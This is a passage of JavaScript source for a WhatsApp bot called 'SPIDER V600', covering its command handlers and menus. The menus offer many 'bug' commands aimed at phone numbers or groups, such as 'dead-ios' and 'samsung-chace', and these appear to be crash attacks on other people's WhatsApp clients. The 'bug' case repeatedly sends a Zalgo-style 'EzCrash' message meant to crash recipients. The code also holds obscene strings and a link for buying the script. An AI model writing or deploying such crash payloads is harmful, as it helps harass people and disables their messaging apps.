◈ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ User : ${Object.keys(db.data.users).length}
◈ Prefix : Multi
 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
 
    \`Owner Cmd\` 

◈ ${prefix}Addprem 62##/TAG 30d
◈ ${prefix}Dellprem 62##/TAG 30d
◈ ${prefix}addowner 2548####
◈ ${prefix}delowner 2548####
◈ ${prefix}zero-bug 2548####
◈ ${prefix}addbadwords kata kasar
◈ ${prefix}delbadwords kata kasar
◈ ${prefix}changemenu button/non
◈ ${prefix}autoread on/off
◈ ${prefix}autotyping on/off
◈ ${prefix}autorecord on/off
◈ ${prefix}autobio on/off
◈ ${prefix}self
◈ ${prefix}public
◈ ${prefix}shutdown
◈ ${prefix}addcase 
◈ ${prefix}delcase
◈ ${prefix}join [link group]
◈ ${prefix}block [nomor]
◈ ${prefix}unblock [nomor]
◈ ${prefix}listblock
◈ ${prefix}setppbot [reply gambar]
◈ ${prefix}setbiobot [teks]
◈ ${prefix}listpc


 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

       \`Group\` 

◈ ${prefix}setppgroup reply gambar
◈ ${prefix}promote tag
◈ ${prefix}demote tag
◈ ${prefix}kick tag
◈ ${prefix}add nomor
◈ ${prefix}editgroup open/close
◈ ${prefix}editsubjek teks 
◈ ${prefix}editinfo teks
◈ ${prefix}editdesk teks
◈ ${prefix}clearchat
◈ ${prefix}resetlinkgc
◈ ${prefix}revoke
◈ ${prefix}infogc
◈ ${prefix}getppgc
◈ ${prefix}mutr
◈ ${prefix}unmute
◈ ${prefix}hidetag
◈ ${prefix}tagsubject
◈ ${prefix}tagall
◈ ${prefix}linkgc
◈ ${prefix}antitoxic on / off
◈ ${prefix}antiasing on / off
◈ ${prefix}antivirtex on / off
◈ ${prefix}antilinkall on / off
◈ ${prefix}antilinkfb on / off
◈ ${prefix}antilinkyt on / off
◈ ${prefix}antilinkytch on / off
◈ ${prefix}antilinkig on / off
◈ ${prefix}antilinktele on / off
◈ ${prefix}antilinktiktok on / off
◈ ${prefix}antilinktwitter on / off
◈ ${prefix}antilink on / off

▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
      *BUGS*
    
◈ ${prefix}bug-button link group
◈ ${prefix}bug-browser link group
◈ ${prefix}bug-gc 120###@g.us
◈ ${prefix}night-night amount pc/gc
◈ ${prefix}penis amount pc/gc
◈ ${prefix}penis2 amount pc/gc
◈ ${prefix}penis2 amount pc/gc
◈ ${prefix}bgtes amount pc/gc
◈ ${prefix}stardust 254####
◈ ${prefix}st4rdust 254####
◈ ${prefix}restart-ui 254####
◈ ${prefix}spdr 2548###
◈ ${prefix}sam-did pc/gc
◈ ${prefix}senggol pc/gc
◈ ${prefix}null-chace amount  pc/gc
◈ ${prefix}bug pc/gc
◈ ${prefix}ltest pc/gc
◈ ${prefix}ma-gic 2548###
◈ ${prefix}sor-ry 2548###|#
◈ ${prefix}bug-penis pc/gc
◈ ${prefix}suck-it 2548###|#
◈ ${prefix}bug-24j 2548###
◈ ${prefix}brutal-bug 2548###
◈ ${prefix}samsung-chace 2548###
◈ ${prefix}samsun 2548###
◈ ${prefix}vios-unli 2548###
◈ ${prefix}dead-ios 2548###
◈ ${prefix}ios-try 2548#|amount
◈ ${prefix}bug-ios 2548#|amount

 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂


`
let msg = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Spider Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": itsmenu,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: ryozingod.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻  Suck_My_Dick  ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"𝕾𝖕𝖎𝖉𝖊𝖗 𝕲𝖆𝖞\nBug\",\"id\":\".bug\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: { url: "https://telegra.ph/file/bd058592ea94a4bb50a7a.jpg"},
caption: itsmenu,
contextInfo:{externalAdReply:{
title: '𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊',
body: `Hie : ${m.pushName}`, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
sourceUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
ryozingod.relayMessage(m.chat, msg, {})
}
}
break
//=================================================//
case "virusmenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
*USER : @${m.sender.split("@")[0]}*
▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
    \`𝐒𝐏𝐈𝐃𝐄𝐑 V600\`
▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
◈ Creator : Taira Makino
◈ Library : WS-Baileys
◈ Type : Case
◈ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ User : ${Object.keys(db.data.users).length}
◈ Prefix : Multi
▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

*V600 BUG MENU*
▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

◈ ${prefix}bug-button link group
◈ ${prefix}bug-browser link group
◈ ${prefix}bug-gc 120###@g.us
◈ ${prefix}night-night amount pc/gc
◈ ${prefix}penis amount pc/gc
◈ ${prefix}penis2 amount pc/gc
◈ ${prefix}penis2 amount pc/gc
◈ ${prefix}bgtes amount pc/gc
◈ ${prefix}stardust 254####
◈ ${prefix}st4rdust 254####
◈ ${prefix}restart-ui 254####
◈ ${prefix}spdr 2548###
◈ ${prefix}sam-did pc/gc
◈ ${prefix}senggol pc/gc
◈ ${prefix}null-chace amount  pc/gc
◈ ${prefix}bug pc/gc
◈ ${prefix}ltest pc/gc
◈ ${prefix}ma-gic 2548###
◈ ${prefix}sor-ry 2548###|#
◈ ${prefix}bug-penis pc/gc
◈ ${prefix}suck-it 2548###|#
◈ ${prefix}bug-24j 2548###
◈ ${prefix}brutal-bug 2548###
◈ ${prefix}samsung-chace 2548###
◈ ${prefix}samsun 2548###
◈ ${prefix}vios-unli 2548###
◈ ${prefix}dead-ios 2548###
◈ ${prefix}ios-try 2548#|amount
◈ ${prefix}bug-ios 2548#|amount

 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

> *night-night*
 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂`
let msg = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Spider Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": itsmenu,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: ryozingod.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻   Spider Execution Vault   ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⿻\nBug\",\"id\":\".bug\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: mengkece,
caption: itsmenu,
contextInfo:{externalAdReply:{
title: '𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊',
body: `Hie : ${m.pushName}`, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
sourceUrl:`https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
ryozingod.relayMessage(m.chat, msg, {})
}
}
break
//=================================================//
case 'botstatus': {
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
penis = fs.readFileSync("./ryozingod.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n◈ ');

joreply(`

   𝐒𝐏𝐈𝐃𝐄𝐑 V600

◈ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
◈ Library : WS-Baileys
◈ Type : Case
◈ Status : Maintenance 
◈ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ User : ${Object.keys(db.data.users).length}
◈ Prefix : Single 
◈ Resp Speed : ${latensi.toFixed(4)}
◈ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
◈ Runtime : ${run}

▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
❐ Total case: ${totalCases}\n\n◈ ${totalCases > 0 ? listCases : "No cases found."}
▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
`)
}
break
//=================================================//
case 'ambilq': {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
fs.writeFileSync('pukimak.json', jsonData);
joreply(jsonData)
}
break
//=================================================//
case 'sc': case 'script': {
joreply(`

https://t.me/Tha_Healer to get the script or for deployment.
`)
}
break
//=================================================//
case 'owner': case 'botowner':
let namaown = `Owner Cakep`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
ryozingod.sendMessage(m.chat, { text: "https://t.me/Tha_Healer"}, { quoted: ryobug})
break
//=================================================//
//=================================================//
case 'runtime':
                let pinga = ` SPIDER V600  Is Active${runtime(process.uptime())}`
                ryozingod.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ѕρι∂єя ν600`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: 'https://telegra.ph/file/bd058592ea94a4bb50a7a.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
		
case 'ping': {
  const startTime = new Date();
  const pingMsg = await ryozingod.sendMessage(m.chat, { text: '*𝑵𝒆𝒖𝒕𝒓𝒐*' });

 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*sᵖⁱᵈᵉʳ ᴠ600 sᵖᵉᵉᵈ ➟ ${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
break;

case 'bug':{
ryozingod.sendMessage(m.chat, { text: `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`}, { quoted: ryobug })
ryozingod.sendMessage(m.chat, { text: `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`}, { quoted: ryobug }) 
ryozingod.sendMessage(m.chat, { text: `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`}, { quoted: ryobug })
ryozingod.sendMessage(m.chat, { text: `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`}, { quoted: ryobug })
ryozingod.sendMessage(m.chat, { text: `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`}, { quoted: ryobug })
ryozingod.sendMessage(m.chat, { text: `🖕🖕`}, { quoted: ryobug })
}
break
		
case "alive":

const audiovn = "./Alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "SPIDER V600",
          body: "https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K",
          thumbnailUrl: "ѕρι∂єя ν5",
          sourceUrl: "https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await ryozingod.sendMessage(m.chat, dooc, {quoted: m});


break;

case 'restart': {
if (!isDeveloper) return joreply(mess.owner)
joreply(`V600 restarting🖐`)
await sleep(5000)
process.exit()
}
break
//=================================================//
case "totalcase": {
//inireact();
if (!isDeveloper) return joreply(mess.owner);
penis = fs.readFileSync("./ryozingod.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n• ');

joreply(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//=================================================//
case "getname": {
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await ryozingod.getName(q)
}
joreply(name)
} else {
joreply(m.pushName)
}
}
break
//=================================================//
case "getpp": {
if (Input) {
try {
var ppWong = await ryozingod.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ryozingod.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await ryozingod.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ryozingod.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
//=================================================//
case 'changemenu':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} button/none`)
if (q == 'button') {
db.data.settings[botNumber].menuType = 'buttonImage'
joreply(`Successfully Changed Menu To Button List Image`)
} else if (q == 'none') {
db.data.settings[botNumber].menuType = 'externalImage'
joreply(`Successfully Changed Auto Typing To External Image`)
}
break
//=================================================//
case 'autorecord':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
joreply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
joreply(`Successfully Changed Auto Record To ${q}`)
}
break;
//=================================================//
case 'autoread':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
joreply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
joreply(`Successfully Changed Auto Read To ${q}`)
}
break
//=================================================//
case 'autotyping':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
joreply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
joreply(`Successfully Changed Auto Typing To ${q}`)
}
break
//=================================================//
case 'autobio':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
joreply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
joreply(`Successfully Changed Auto Bio To ${q}`)
}
break
//=================================================//
case 'onlygroup':
case 'onlygc':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
joreply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
joreply(`Successfully Changed Onlygroup To ${q}`)
}
break
//=================================================//
case 'join': {
if (!isDeveloper) return joreply(mess.owner)
if (!text) return joreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
joreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ryozingod.groupAcceptInvite(result).then((res) => joreply(jsonformat(res))).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
if (!isDeveloper) return joreply(mess.owner)
ryozingod.public = false
joreply('succes')
}
break
//=================================================//
case 'block':
if (!isDeveloper) return joreply(mess.owner);
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await ryozingod.updateBlockStatus(users, "block")
joreply(`Sukses block user`)
} else {
joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return joreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ryozingod.updateBlockStatus(woke, "block")
} else if(!q){
joreply("Masukan nomer yang ingin di block")
}
joreply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
//=================================================//
case 'unblock':
if (!isDeveloper) return joreply(mess.owner);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await ryozingod.updateBlockStatus(users, "unblock")
await joreply(`Sukses unblock user`)
} else if(!q){
joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return joreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ryozingod.updateBlockStatus(woke, "unblock")
joreply(`Sukses unblock ${woke}`)
} else if(!q){
joreply("Masukan nomer yang ingin di unblock")
}

}
break
//=================================================//
case 'listblock':{
let block = await ryozingod.fetchBlocklist()
joreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot': {
if (!isDeveloper) return joreply(mess.owner);
if(m.quoted){
const media = await ryozingod.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ryozingod.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await joreply(`${mess.success}`)
} else joreply("Reply fotonya")
}
break
//=================================================//
case 'delppbot': {
if (!isDeveloper) return joreply(mess.owner);
ryozingod.removeProfilePicture(ryozingod.user.id)
joreply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await ryozingod.updateProfileStatus(q)
await joreply(`Berhasil mengganti status bio ke *${q}*`)
}
break
//=================================================//
case 'listpc': {
if (!isDeveloper) return joreply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
joreply(teks)
}
break
//=================================================//
case "addcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply(`Masukan Input`);
if (!q.includes("|")) return joreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case "${tempat}":`));

if (breakIndex !== -1) {
fileContent = fileContent.slice(0, breakIndex + 6) + newCase + fileContent.slice(breakIndex + 6);

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
joreply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case "${caseName}" berhasil dihapus!`);
} else {
joreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
//Owner fitur
case 'addprem': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 2)
return joreply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
joreply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/bd058592ea94a4bb50a7a.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
case 'delprem': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
joreply("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya))
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/bd058592ea94a4bb50a7a.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
joreply("Entitas premium tidak ditemukan")
}
}
}
break
//=================================================//
case 'addbadwords': {
if (!isDeveloper) return joreply(mess.owner)
if (!text) return joreply(`Penggunaan ${prefix+command} anjing`)
addbadwords(text)
}
break
//=================================================//
case 'deletebadwords': case 'delbadwords': {
if (!isDeveloper) return joreply(mess.owner)
if (!text) return joreply(`Penggunaan ${prefix+command} anjing`)
deletebadwords(text)
}
break
//=================================================//
case 'addowner': {
if (!isDeveloper) return joreply(mess.owner)
if (!args[0]) return joreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await ryozingod.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
joreply(`${prem1} Sudah menjadi kontributor!!!`)
ryozingod.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
if (!isDeveloper) return joreply(mess.owner)
if (!args[0]) return joreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
joreply(`${prem2} Tidak lagi Kontributor!!!`)
}
break
//=================================================//
case 'addseller':
if (!isDeveloper) return
if (!args[0]) return joreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
joreply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
